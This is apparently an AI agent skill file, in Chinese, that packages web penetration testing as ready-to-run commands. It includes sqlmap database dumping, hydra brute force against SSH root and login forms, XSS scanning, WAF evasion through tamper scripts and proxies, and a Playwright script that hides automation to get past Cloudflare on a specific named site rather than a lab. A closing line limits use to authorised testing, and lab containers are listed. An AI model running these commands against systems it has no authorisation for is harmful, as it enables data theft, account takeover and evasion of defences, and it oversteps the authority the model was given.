---
name: web-security
description: Web安全渗透测试技能，基于 WebSecurityGuide。提供信息收集、漏洞扫描、渗透测试等功能。
homepage: https://github.com/Espl0it/WebSecurityGuide
metadata: {"clawdbot":{"emoji":"🛡️","requires":{"bins":["nmap","sqlmap","nikto","hydra","john","whatweb","netcat","curl","wget","git","python3","pip3"],"env":["WEB_SECURITY_CONFIG"],"files":["/home/ecs-user/.openclaw/workspace/projects/WebSecurityGuide"]},"primaryEnv":"WEB_SECURITY_CONFIG"}}
---

# Web Security - Web 安全渗透测试

基于 WebSecurityGuide 的渗透测试技能。

## 环境要求

本技能需要以下工具（Kali Linux 已预装）：

### 必需工具
- **nmap** - 端口扫描
- **sqlmap** - SQL 注入检测
- **nikto** - Web 漏洞扫描
- **hydra** - 暴力破解
- **whatweb** - CMS 指纹识别
- **netcat** - 网络瑞士军刀
- **curl** - HTTP 请求

### 可选工具（推荐安装）
- **sqlmap** - SQL 注入
- **xsstrike** - XSS 扫描
- **dalfox** - XSS 扫描
- **beef-xss** - XSS 利用框架
- **sublist3r** - 子域名扫描
- **amass** - 子域名枚举
- **gobuster** - 目录扫描
- **ffuf** - 模糊测试
- **wpscan** - WordPress 扫描
- **theHarvester** - OSINT 侦察

## 快速开始

### 1. 端口扫描

```bash
# 基本扫描
nmap 192.168.1.1

# 全面扫描
nmap -A 192.168.1.1

# 扫描常见端口
nmap -F 192.168.1.1

# 服务版本检测
nmap -sV 192.168.1.1
```

### 2. SQL 注入检测

```bash
# 检测注入点
sqlmap -u "http://target.com/vuln.php?id=1"

# 获取数据库
sqlmap -u "http://target.com/vuln.php?id=1" --dbs

# 导出数据
sqlmap -u "http://target.com/vuln.php?id=1" --dump
```

### 3. Web 漏洞扫描

```bash
# Nikto 扫描
nikto -h http://target.com

# WhatWeb 指纹识别
whatweb http://target.com

# 目录扫描
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/big.txt
```

### 4. 密码攻击

```bash
# SSH 暴力破解
hydra -l root -P passwords.txt 192.168.1.1 ssh

# HTTP 表单破解
hydra -L users.txt -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
```

### 5. XSS 检测

```bash
# XSStrike 扫描
python3 /path/to/xsstrike.py -u "http://target.com/search?q=test"

# dalfox 扫描
dalfox url "http://target.com?q=test"
```

### 6. WAF 绕过

```bash
# WAF 识别
whatwaf -u http://target.com

# SQL 注入绕过
sqlmap -u "http://target.com?id=1" --tamper=space2comment,between,randomcase

# XSS 绕过测试
xsstrike -u "http://target.com/search?q=test" --encode
```

### 7. WAF 绕过 (详细)

```bash
# WAF 识别
whatwaf --esp -u http://target.com
wafw00f http://target.com

# SQL 注入绕过 - 常用 tamper 组合
sqlmap -u "http://target.com?id=1" --tamper=space2comment,between,charencode
sqlmap -u "http://target.com?id=1" --tamper=space2comment,randomcase
sqlmap -u "http://target.com?id=1" --tamper=between,equaltolike

# 高风险测试
sqlmap -u "http://target.com?id=1" --level=5 --risk=3 --tamper=space2comment,between,randomcase

# XSS 绕过
xsstrike -u "http://target.com/search?q=test" --encode
xsstrike -u "http://target.com/search?q=test" --json
xsstrike -u "http://target.com/search?q=test" --path-override

# WAF 绕过参数
sqlmap -u "http://target.com?id=1" --random-agent --delay=1 --timeout=10
sqlmap -u "http://target.com?id=1" --proxy=http://127.0.0.1:8080
```

### 8. 浏览器自动化 (Cloudflare 绕过)

```bash
# 使用 Playwright 绕过 Cloudflare
cd /home/ecs-user/.openclaw/workspace/skills/puppeteer-browser
node browser.js screenshot https://www.mehs.us/
node browser.js content https://www.mehs.us/

# 绕过 Cloudflare JS Challenge
node -e "
const { chromium } = require('playwright');
(async () => {
  const browser = await chromium.launch({ 
    headless: false,
    args: ['--disable-blink-features=AutomationControlled']
  });
  const page = await browser.newPage();
  
  // 设置真实 UA
  await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
  
  // 绕过自动化检测
  await page.evaluateOnNewDocument(() => {
    Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
  });
  
  await page.goto('https://www.mehs.us/', { waitUntil: 'networkidle0', timeout: 60000 });
  await page.waitForTimeout(5000); // 等待 Cloudflare 挑战
  
  const content = await page.content();
  console.log('页面长度:', content.length);
  
  await browser.close();
})();
"
```

### 9. WAF 绕过 Tamper 脚本

SQLMap 内置 Tamper 脚本（位于 `/usr/share/sqlmap/tamper/`）：

| 脚本 | 作用 |
|------|------|
| space2comment | 空格替换为 /**/ |
| space2dash | 空格替换为 -- |
| between | > 替换为 BETWEEN |
| charencode | 字符编码 |
| charunicodeencode | Unicode 编码 |
| randomcase | 大小写随机 |
| equaltolike | = 替换为 LIKE |
| greatest | > 替换为 GREATEST |

### 9. 自定义 Tamper 脚本

创建自定义 Tamper（保存为 `mytamper.py`）：

```python
#!/usr/bin/env python
def tamper(payload, **kwargs):
    if payload:
        payload = payload.replace(" ", "/**/")
        payload = payload.replace("'", "/*'*/")
    return payload
```

使用自定义 Tamper：
```bash
sqlmap -u "http://target.com?id=1" --tamper=mytamper
```

## 常用命令速查

| 功能 | 命令 |
|------|------|
| 端口扫描 | `nmap -sS -sV -O target` |
| SQL 注入 | `sqlmap -u URL --dbs` |
| 目录扫描 | `dirb http://target.com/` |
| 子域名 | `sublist3r -d target.com` |
| 指纹识别 | `whatweb target.com` |
| 漏洞扫描 | `nikto -h target.com` |
| 密码破解 | `hydra -L users -P pass ssh://target` |
| XSS 扫描 | `dalfox url URL` |

## 配置

### 环境变量

```bash
# 可选：配置文件路径
export WEB_SECURITY_CONFIG="/path/to/config"
```

### 靶场练习

推荐使用 Docker 搭建靶场：

```bash
# DVWA
docker run -d -p 8080:80 --name dvwa vulnerables/web-dvwa

# SQLI-LABS
docker run -d -p 8081:80 --name sqli-labs acgpiano/sqli-labs

# Upload-Labs
docker run -d -p 8082:80 --name upload-labs c0ny1/upload-labs
```

## 参考文档

- 详细教程：https://github.com/Espl0it/WebSecurityGuide
- Kali Tools：https://tools.kali.org/
- OWASP：https://owasp.org/

## 注意事项

1. 仅用于授权的渗透测试
2. 遵守法律法规
3. 测试前获得书面授权
4. 不对目标系统造成破坏
